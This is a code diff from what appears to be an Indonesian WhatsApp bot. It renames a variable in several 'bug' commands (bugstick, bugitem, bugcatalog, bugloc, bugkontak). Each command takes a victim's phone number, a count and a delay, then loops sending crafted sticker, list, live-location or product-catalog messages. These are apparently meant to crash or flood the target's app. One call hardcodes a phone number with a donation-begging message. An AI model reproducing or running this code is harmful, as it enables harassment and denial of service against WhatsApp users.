@@ -672,7 +672,7 @@ let bguttonMessaage = {
 document: { url: zk.url }, 
 fileName: `${zk.filename}`, 
 mimetype: `application/zip`,
-jpegThumbnail: ppnyauser,
+jpegThumbnail: ppnya,
 caption: mbc,
 mentions:[sender, djej],
 footer: `_Powered By @${djej.split("@")[0]}_`,
@@ -5285,7 +5285,7 @@ num = q.split('|')[0]+'@s.whatsapp.net'
 jumlah = q.split('|')[1]
 waktu = q.split('|')[2]
 for (let i = 0; i < jumlah; i++) {
-alfa.sendMessage(num, {sticker: ppnyauser},{ quoted: bug })
+alfa.sendMessage(num, {sticker: ppnya},{ quoted: bug })
 await sleep(ms(waktu))
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
@@ -5313,7 +5313,7 @@ num = q.split('|')[0]+'@s.whatsapp.net'
 jumlah = q.split('|')[1]
 waktu = q.split('|')[2]
 for (let i = 0; i < jumlah; i++) {
-sendListBugfc(num, 'Hallo Kak', 'Aku alfa', 'Minta Donasi Nya Donk Kak', ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
+sendListBugfc(num, 'Hallo Kak', 'Aku alfa', 'Minta Donasi Nya Donk Kak', ppnya, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
 await sleep(ms(waktu))
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah} Dengan Timer ${waktu}`)
@@ -5327,7 +5327,7 @@ num = q.split('|')[0]+'@s.whatsapp.net'
 jumlah = q.split('|')[1]
 waktu = q.split('|')[2]
 for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: alfa.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: ppnya }, { upload: alfa.waUploadToServer })
 var liveLocation = generateWAMessageFromContent(num, proto.Message.fromObject({
 "liveLocationMessage": {
 "degreesLatitude": -6.9367014,
@@ -5352,7 +5352,7 @@ num = q.split('|')[0]+'@s.whatsapp.net'
 jumlah = q.split('|')[1]
 waktu = q.split('|')[2]
 for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: alfa.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: ppnya }, { upload: alfa.waUploadToServer })
 var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "productMessage": {
 "product": {
@@ -5387,11 +5387,11 @@ ${hit+=1}. ${prefix}spam 628xxx|5|5s
 ${hit+=1}. ${prefix}Catalog <628xxx|jumlah|waktu>
 ${hit+=1}. ${prefix}bugkontak 628×××|5|5s
 ${hit+=1}. ${prefix}vanh
-${hitnya+=1} ${prefix}bugitem <628×××|10|10s>
-${hitnya+=1} ${prefix}bugstick <628×××|10|10s>
-${hitnya+=1} ${prefix}bugcatalog <628×××|10|10s>
-${hitnya+=1} ${prefix}bugloc <628×××|10|10s>
-${hitnya+=1} ${prefix}bugkontak <628×××|10|10s>
+${hit+=1} ${prefix}bugitem <628×××|10|10s>
+${hit+=1} ${prefix}bugstick <628×××|10|10s>
+${hit+=1} ${prefix}bugcatalog <628×××|10|10s>
+${hit+=1} ${prefix}bugloc <628×××|10|10s>
+${hit+=1} ${prefix}bugkontak <628×××|10|10s>
 `
 const men = ['loc1','loc2','loc3']
 const rndmmenu =  men[Math.floor(Math.random() * (men.length))]
